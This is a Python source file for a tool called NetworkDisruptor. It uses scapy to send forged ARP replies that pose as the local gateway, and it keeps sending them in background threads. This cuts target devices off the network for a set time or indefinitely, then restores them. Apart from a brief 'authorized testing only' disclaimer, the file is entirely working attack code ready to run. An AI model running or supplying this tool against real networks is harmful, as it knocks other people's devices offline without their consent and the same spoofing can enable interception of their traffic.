"""
LEGAL DISCLAIMER:
This tool is for authorized security testing ONLY.
Unauthorized use may violate laws. Use at your own risk.
"""

import time
import threading
import logging
from scapy.all import ARP, Ether, send, srp, conf
import netifaces

# Configure logging
logger = logging.getLogger("network_disruptor")
logger.setLevel(logging.INFO)
if not logger.handlers:
    import os
    os.makedirs("instance", exist_ok=True)
    fh = logging.FileHandler("instance/network_disruptor.log")
    fh.setFormatter(logging.Formatter(
        "%(asctime)s [%(levelname)s] %(name)s — %(message)s"
    ))
    logger.addHandler(fh)

conf.verb = 0

class NetworkDisruptor:
    """Tool to disconnect devices from network using ARP spoofing"""
    
    def __init__(self):
        self.active_attacks = {}
        self.attack_lock = threading.Lock()
        self.gateway_ip = None
        self.gateway_mac = None
    
    def get_gateway_info(self):
        """Get router IP and MAC address"""
        try:
            gateways = netifaces.gateways()
            default_gateway = gateways['default'][netifaces.AF_INET]
            self.gateway_ip = default_gateway[0]
            self.gateway_mac = self._get_mac(self.gateway_ip)
            
            if self.gateway_mac:
                return True, f"Gateway: {self.gateway_ip}"
            else:
                return False, "Failed to get Gateway MAC"
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def _get_mac(self, ip):
        """Get MAC address for given IP"""
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            
            if answered_list:
                return answered_list[0][1].hwsrc
            return None
        except Exception as e:
            print(f"Error getting MAC for {ip}: {e}")
            return None
    
    def _spoof(self, target_ip, target_mac, spoof_ip):
        """Send fake ARP packet"""
        try:
            packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
            send(packet, verbose=False)
        except Exception as e:
            print(f"Spoofing error: {e}")
    
    def _restore(self, target_ip, target_mac, gateway_ip, gateway_mac):
        """Restore normal connection"""
        try:
            packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                        psrc=gateway_ip, hwsrc=gateway_mac)
            send(packet, count=5, verbose=False)
        except Exception as e:
            print(f"Restore error: {e}")
    
    def kick_device(self, target_ip, duration=None):
        """
        Disconnect device from network
        
        Args:
            target_ip: Target device IP
            duration: Duration in seconds (None = permanent)
        
        Returns:
            (success, message)
        """
        if not self.gateway_ip or not self.gateway_mac:
            success, msg = self.get_gateway_info()
            if not success:
                return False, msg
        
        target_mac = self._get_mac(target_ip)
        if not target_mac:
            return False, f"Device not found at {target_ip}"
        
        with self.attack_lock:
            if target_ip in self.active_attacks:
                return False, f"Attack already active on {target_ip}"
        
        attack_thread = threading.Thread(
            target=self._attack_worker,
            args=(target_ip, target_mac, duration),
            daemon=True
        )
        
        with self.attack_lock:
            self.active_attacks[target_ip] = attack_thread
        
        attack_thread.start()
        
        duration_msg = f"for {duration}s" if duration else "indefinitely"
        logger.critical(f"ATTACK: Device {target_ip} disconnected {duration_msg}")
        return True, f"Disconnecting {target_ip} {duration_msg}"
    
    def _attack_worker(self, target_ip, target_mac, duration):
        """Continuous attack worker"""
        start_time = time.time()
        
        try:
            logger.info(f"Starting ARP spoofing attack on {target_ip} ({target_mac})")
            
            while True:
                self._spoof(target_ip, target_mac, self.gateway_ip)
                time.sleep(2)
                
                if duration and (time.time() - start_time) > duration:
                    logger.info(f"Attack duration expired for {target_ip}")
                    break
                
                with self.attack_lock:
                    if target_ip not in self.active_attacks:
                        logger.info(f"Attack manually stopped for {target_ip}")
                        break
        finally:
            logger.info(f"Restoring normal ARP table for {target_ip}")
            self._restore(target_ip, target_mac, self.gateway_ip, self.gateway_mac)
            
            with self.attack_lock:
                if target_ip in self.active_attacks:
                    del self.active_attacks[target_ip]
    
    def stop_attack(self, target_ip):
        """Stop attack on specific device"""
        with self.attack_lock:
            if target_ip in self.active_attacks:
                del self.active_attacks[target_ip]
                return True, f"Stopped attack on {target_ip}"
            return False, f"No active attack on {target_ip}"
    
    def stop_all_attacks(self):
        """Stop all attacks"""
        with self.attack_lock:
            count = len(self.active_attacks)
            self.active_attacks.clear()
        return count, f"Stopped {count} attacks"
    
    def get_active_attacks(self):
        """Get list of active attacks"""
        with self.attack_lock:
            return list(self.active_attacks.keys())